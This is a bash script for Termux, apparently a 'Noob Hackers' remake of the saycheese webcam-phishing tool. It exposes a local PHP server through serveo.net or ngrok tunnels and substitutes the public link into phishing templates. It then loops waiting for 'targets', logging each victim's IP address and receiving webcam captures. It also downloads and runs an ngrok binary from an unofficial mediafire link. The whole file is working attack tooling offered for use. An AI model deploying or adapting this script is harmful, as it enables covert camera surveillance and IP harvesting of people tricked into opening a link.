#!/bin/bash
# Script modified by Noob Hackers
# Thanks to linuxchoice
# If you use any part of this code, give credit. Read the License!

clear
termux-setup-storage
pkg install php -y
pkg install wget -y
clear
trap 'printf "\n"; stop' 2

banner() {
  echo '
  _   _  _____          __  __ 
 | \ | |/ ____|   /\   |  \/  |
 |  \| | |       /  \  | \  / |
 | . ` | |      / /\ \ | |\/| |
 | |\  | |____ / ____ \| |  | |
 |_| \_|\_____/_/    \_\_|  |_| ' | lolcat

  echo ""
  printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
  printf "          \e[1;77m v1.1 Reborn script by { Noob Hackers }\e[0m \n"
  echo "      N073:> PLEASE TURN ON YOUR HOTSPOT OR ELSE YOU WON'T GET A LINK!"
}

stop() {
  for process in ngrok php ssh; do
    pkill -f -2 "$process" > /dev/null 2>&1
  done
  exit 1
}

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "PHP is required but not installed. Aborting."; exit 1; }
}

catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
  cat ip.txt >> saved.ip.txt
}

checkfound() {
  printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets. Press Ctrl + C to exit...\e[0m\n"
  while true; do
    [[ -e "ip.txt" ]] && { printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"; catch_ip; rm -rf ip.txt; }
    [[ -e "Log.log" ]] && { printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"; rm -rf Log.log; }
    sleep 0.5
  done
}

server() {
  command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH is required but not installed. Aborting."; exit 1; }
  printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

  [[ $checkphp == *'php'* ]] && killall -2 php > /dev/null 2>&1

  if [[ $subdomain_resp == true ]]; then
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "$subdomain:80:localhost:3333" serveo.net 2>/dev/null > sendlink &
  else
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2>/dev/null > sendlink &
  fi

  sleep 8
  printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
  fuser -k 3333/tcp > /dev/null 2>&1
  php -S localhost:3333 > /dev/null 2>&1 &
  sleep 3
  send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
  printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$send_link"
}



payload_ngrok() {
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
  sed "s+forwarding_link+$link+g" grabcam.html > index2.html
  sed "s+forwarding_link+$link+g" template.php > index.php
}

ngrok_server() {
  [[ -e ngrok ]] || {
    command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is required but not installed. Aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is required but not installed. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
    
    wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1
    chmod +x ngrok
    rm -rf ngrok.zip
  }

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok server...\n"
  ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 10

  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
  payload_ngrok
  checkfound
}

start1() {
  [[ -e sendlink ]] && rm -rf sendlink

  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m] Serveo.net\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m] Ngrok\e[0m\n"
  
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
  option_server="${option_server:-1}"

  case $option_server in
    1) start ;;
    2) ngrok_server ;;
    *) printf "\e[1;93m[!] Invalid option!\e[0m\n"; sleep 1; clear; start1 ;;
  esac
}

payload() {
  send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
  sed "s+forwarding_link+$send_link+g" grabcam.html > index2.html
  sed "s+forwarding_link+$send_link+g" template.php > index.php
}

start() {
  printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default: [Y/n]): \e[0m'
  read choose_sub
  choose_sub="${choose_sub:-Y}"

  if [[ $choose_sub =~ ^[Yy] ]]; then
    subdomain_resp=true
    default_subdomain="grabcam$RANDOM"
    printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default: %s): \e[0m' "$default_subdomain"
    read subdomain
    subdomain="${subdomain:-$default_subdomain}"
  fi

  server
  payload
  checkfound
}

banner
dependencies
start1
